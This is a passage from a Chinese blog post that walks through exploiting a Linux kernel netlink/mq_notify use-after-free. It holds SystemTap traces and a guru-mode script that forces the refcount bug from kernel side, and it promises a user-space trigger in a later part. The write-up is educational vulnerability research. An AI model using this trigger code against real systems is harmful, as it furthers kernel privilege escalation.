timeo=0xffff88003a3bbf08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880036446000 &#125;=-</span><br><span class="line">- sk = 0xffff880036446000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- (before) nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!</span><br><span class="line">(5409-5409) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(5409-5409) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(5409-5409) &gt;&gt;&gt; netlink_detachskb (sk=0xffff880036446000 skb=0xffff88003d46af00)</span><br><span class="line">(5409-5409) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff880036446000 &#125;=-</span><br><span class="line">- sk = 0xffff880036446000</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(5409-5409) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p>可以看到<code>refcounter</code>从2被减为0，触发漏洞成功。由于<code>refcounter</code>为0，意味着会被释放，加入更多的probe监控kfree：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">probe kernel.function(<span class="string">"kfree"</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (execname()==<span class="string">"exploit"</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"(%d-%d) &gt;&gt;&gt; kfree (%s)\n"</span>, pid(), tid(), $$parms)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">(5729-5729) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffdf31f9fb0)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5729-5729) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(5729-5729) &gt;&gt;&gt; skb_put (skb=0xffff88003ac76d00 len=0x20)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; skb_put = ffff88003a9d7e00</span><br><span class="line">(5729-5729) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; __fdget = ffff8800078bd700</span><br><span class="line">(5729-5729) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff8800078bd700)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003af98800</span><br><span class="line">(5729-5729) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003af98800 skb=0xffff88003ac76d00 timeo=0xffff88003a3d3f08 ssk=0x0)</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003af98800 &#125;=-</span><br><span class="line">- sk = 0xffff88003af98800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 2</span><br><span class="line">- (before) nlk-&gt;state = 0</span><br><span class="line">- (after) nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 100</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">!!&gt;&gt;&gt; REMOVING FD=3 FROM FDT &lt;&lt;&lt;!!</span><br><span class="line">(5729-5729) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(5729-5729) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(5729-5729) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003af98800 skb=0xffff88003ac76d00)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; kfree (objp=0xffff88003a9d7e00)</span><br><span class="line">(5729-5729) &gt;&gt;&gt; kfree (objp=0xffff88003af98800)</span><br><span class="line">(5729-5729) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003af98800 &#125;=-</span><br><span class="line">- sk = 0xffff88003af98800</span><br><span class="line">- sk-&gt;sk_rmem_alloc = 0</span><br><span class="line">- sk-&gt;sk_rcvbuf = 212992</span><br><span class="line">- sk-&gt;sk_refcnt = 0</span><br><span class="line">- nlk-&gt;state = 1</span><br><span class="line">- sk-&gt;sk_flags = 101</span><br><span class="line">- SOCK_DEAD = 0</span><br><span class="line">-=&#123; dump_netlink_sock: END&#125;=-</span><br><span class="line">(5729-5729) &lt;&lt;&lt; mq_notify = fffffffffffffff7</span><br></pre></td></tr></table></figure>
<p>虽然<code>sock</code>被释放了，但还没有<em>use after free</em>。</p>
<h4 id="为什么内核没有崩溃？"><a href="#为什么内核没有崩溃？" class="headerlink" title="为什么内核没有崩溃？"></a>为什么内核没有崩溃？</h4><p>与我们最初的计划不同的是，<code>netlink_sock</code>对象被<code>netlink_detachskb()</code>释放。原因是我们没有调用<code>close()</code>函数（仅重置了FDT），文件对象实际上没有释放，因此<code>netlink_sock</code>对象的引用没有被减少。换句话说，我们少了一次对引用的减少操作。但我们目前只是要验证<code>refcounter</code>是否会被减少两次（<code>netlink_attachskb()</code>和<code>netlink_detachskb()</code>各一次）。</p>
<blockquote>
<p>In the normal course of operation (i.e. we call <em>close()</em>), this additional refcounter decrease will occur and <em>netlink_detachskb()</em> will do a UAF. We will even “delay” this use-after-free to a later moment to get a better control (cf. part 2).</p>
</blockquote>
<h4 id="最终的SystemTap脚本"><a href="#最终的SystemTap脚本" class="headerlink" title="最终的SystemTap脚本"></a>最终的SystemTap脚本</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># mq_notify_force_crash.stp</span><br><span class="line">#</span><br><span class="line"># Run it with <span class="string">"stap -v -g ./mq_notify_force_crash.stp"</span> (guru mode)</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/netlink_sock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fdtable.h&gt;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">function force_trigger:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  sk-&gt;sk_flags |= (<span class="number">1</span> &lt;&lt; SOCK_DEAD); <span class="comment">// avoid blocking the thread</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">  nlk-&gt;state |= <span class="number">1</span>;   <span class="comment">// enter the netlink_attachskb() retry path    </span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">  fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function (<span class="string">"netlink_attachskb"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (execname() == <span class="string">"exploit"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    force_trigger($sk);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x06-结论"><a href="#0x06-结论" class="headerlink" title="0x06 结论"></a>0x06 结论</h3><p>在本文中，我们主要介绍了漏洞的相关知识并使用<em>System Tap Guru Mode</em>强制触发漏洞。在下一部分的文章，我们将一步步把当前的从内核态强制触发漏洞的代码转换成从用户态触发。</p>

      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/kernel/" rel="tag"># kernel</a>
          
            <a href="/tags/cve/" rel="tag"># cve</a>
          
            <a href="/tags/vul/" rel="tag"># vul</a>
          
        </div>
      

      
      
        <div class="post-widgets">
        

        

        
          
          <div class="social_share">
            
            
              <div id="needsharebutton-postbottom">
                <span class="btn">
                  <i class="fa fa-share-alt" aria-hidden="true"></i>
                </span>
              </div>
            
          </div>
        
        </div>
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/17/sctf2019-pwn/" rel="next" title="SCTF 2019 pwn writeup">
                <i class="fa fa-chevron-left"></i> SCTF 2019 pwn writeup
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/28/ciscn-2019-final/" rel="prev" title="2019全国大学生信息安全竞赛(CISCN)总决赛Pwn WriteUp">
                2019全国大学生信息安全竞赛(CISCN)总决赛Pwn WriteUp <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/avatar/avatar.jpeg"
                alt="sunichi"/>
            
              <p class="site-author-name" itemprop="name">sunichi</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">36</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                      <a href="/tags/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">39</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/sunichi" title="GitHub &rarr; https://github.com/sunichi" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://twitter.com/sunichi17" title="Twitter &rarr; https://twitter.com/sunichi17" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            </div>
          

          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top" title="http://p4nda.top" rel="noopener" target="_blank">P4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.aisissel.cn/" title="https://blog.aisissel.cn/" rel="noopener" target="_blank">Sissel</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://thinkycx.me/" title="https://thinkycx.me/" rel="noopener" target="_blank">thinkycx</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-核心基础知识"><span class="nav-number">2.</span> <span class="nav-text">0x01 核心基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#进程描述符和current宏"><span class="nav-number">2.1.</span> <span class="nav-text">进程描述符和current宏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件描述符、文件对象、文件描述表"><span class="nav-number">2.2.</span> <span class="nav-text">文件描述符、文件对象、文件描述表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#虚函数表-VFT"><span class="nav-number">2.3.</span> <span class="nav-text">虚函数表(VFT)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Socket、Sock、SKB"><span class="nav-number">2.4.</span> <span class="nav-text">Socket、Sock、SKB</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Netlink-Socket"><span class="nav-number">2.5.</span> <span class="nav-text">Netlink Socket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Putting-it-all-together"><span class="nav-number">2.6.</span> <span class="nav-text">Putting it all together</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference-counters"><span class="nav-number">2.7.</span> <span class="nav-text">Reference counters</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Public-Information"><span class="nav-number">3.</span> <span class="nav-text">0x02 Public Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Understanding-the-Bug"><span class="nav-number">4.</span> <span class="nav-text">0x03 Understanding the Bug</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#问题代码"><span class="nav-number">4.1.</span> <span class="nav-text">问题代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么要清空sock指针"><span class="nav-number">4.2.</span> <span class="nav-text">为什么要清空sock指针</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#条件竞争"><span class="nav-number">4.3.</span> <span class="nav-text">条件竞争</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击场景"><span class="nav-number">4.4.</span> <span class="nav-text">攻击场景</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-如何到达retry逻辑"><span class="nav-number">5.</span> <span class="nav-text">0x04  如何到达retry逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分析retry之前的代码"><span class="nav-number">5.1.</span> <span class="nav-text">分析retry之前的代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开始编写exploitation"><span class="nav-number">5.2.</span> <span class="nav-text">开始编写exploitation</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#System-Tap"><span class="nav-number">5.3.</span> <span class="nav-text">System Tap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#First-Bug"><span class="nav-number">5.4.</span> <span class="nav-text">First Bug</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-强制触发"><span class="nav-number">6.</span> <span class="nav-text">0x05 强制触发</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#到达netlink-attachskb"><span class="nav-number">6.1.</span> <span class="nav-text">到达netlink_attachskb()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#强制netlink-attachskb-进入retry"><span class="nav-number">6.2.</span> <span class="nav-text">强制netlink_attachskb()进入retry</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#避免exploit阻塞"><span class="nav-number">6.3.</span> <span class="nav-text">避免exploit阻塞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#停止死循环"><span class="nav-number">6.4.</span> <span class="nav-text">停止死循环</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看refcounter"><span class="nav-number">6.5.</span> <span class="nav-text">查看refcounter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么内核没有崩溃？"><span class="nav-number">6.6.</span> <span class="nav-text">为什么内核没有崩溃？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最终的SystemTap脚本"><span class="nav-number">6.7.</span> <span class="nav-text">最终的SystemTap脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-结论"><span class="nav-number">7.</span> <span class="nav-text">0x06 结论</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sunichi</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.4.4</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=7.0.1"></script>

  <script src="/js/src/motion.js?v=7.0.1"></script>



  
  


  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>



  
  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
<script src="/js/src/post-details.js?v=7.0.1"></script>



  


  <script src="/js/src/next-boot.js?v=7.0.1"></script>


  

  

  

  


  


  
  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  

  

  
  
  
  <script src="/lib/needsharebutton/needsharebutton.js"></script>
  <script>
    
